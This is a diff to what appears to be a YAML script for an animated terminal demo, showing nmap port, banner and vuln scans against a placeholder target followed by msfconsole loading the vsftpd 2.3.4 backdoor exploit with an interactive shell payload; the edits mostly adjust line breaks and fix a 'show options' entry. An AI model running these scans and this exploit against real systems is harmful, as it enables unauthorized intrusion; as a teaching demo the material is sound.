@@ -7,11 +7,11 @@
     $target has address 67.207.80.24
     $target has IPv6 address 2604:a880:400:d0::1741:7001 
     $target has IPv6 address 2604:a880:400:d0::182c:1001
-- type: linebreak
-  prefix: default
 - type: char
   value: nmap -sT -p- -Pn $target
   prefix: default
+- type: block
+  value: Starting Nmap 7.80 ( https://nmap.org )
 - type: pause
   value: 2000
 - type: line
@@ -60,16 +60,15 @@
     56229/tcp open  unknown
 
     Nmap done: 1 IP address (1 host up) scanned in 2.05 seconds
-- type: linebreak
-  prefix: default
 - type: char
   value: nmap --script banner $target
   prefix: default
+- type: block
+  value: Starting Nmap 7.80 ( https://nmap.org )
 - type: pause
   value: 2000
 - type: line
   value: |
-    Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-28 19:59 GMT
     Nmap scan report for $target
     Host is up (0.0091s latency).
     Not shown: 977 closed ports
@@ -112,16 +111,15 @@
     MAC Address: 00:15:5D:29:81:0C (Microsoft)
 
     Nmap done: 1 IP address (1 host up) scanned in 2.10 seconds
-- type: linebreak
-  prefix: default
 - type: char
   value: nmap --script vuln $target
   prefix: default
+- type: block
+  value: Starting Nmap 7.80 ( https://nmap.org )
 - type: pause
   value: 2000
 - type: line
   value: |
-    Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-28 19:59 GMT
     Pre-scan script results:
     | broadcast-avahi-dos:
     |   Discovered hosts:
@@ -802,9 +800,6 @@
     |_smb-vuln-regsvc-dos: ERROR: Script execution failed (use -d to debug)
 
     Nmap done: 1 IP address (1 host up) scanned in 2.40 seconds
-
-- type: linebreak
-  prefix: default
 - type: char
   value: msfconsole
   prefix: default
@@ -881,8 +876,8 @@
   prefix: msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
 - type: block
   value: payload => cmd/unix/interact
-- type: show options
-  value: set payload cmd/unix/interact
+- type: char
+  value: show options
   prefix: msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
 - type: linebreak
 - type: block
